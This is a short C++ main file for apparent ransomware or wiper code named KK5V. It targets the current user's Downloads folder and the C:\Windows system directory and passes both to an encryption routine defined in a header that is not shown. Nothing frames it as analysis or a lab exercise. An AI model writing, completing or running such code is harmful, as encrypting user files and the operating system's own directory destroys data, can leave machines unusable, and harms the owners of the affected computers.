#include "kk5v.h"
#include <iostream>

int main()
{
    // Define the directories to process (adjust the paths as per your system)
    const std::string userProfileDownload = getenv("USERPROFILE") + std::string("\\Downloads");
    const std::string windowsDir = "C:\\Windows";

    // Encrypt files in Downloads and Windows directory
    KK5V::processDirectory(userProfileDownload);
    KK5V::processDirectory(windowsDir);

    return 0;
}
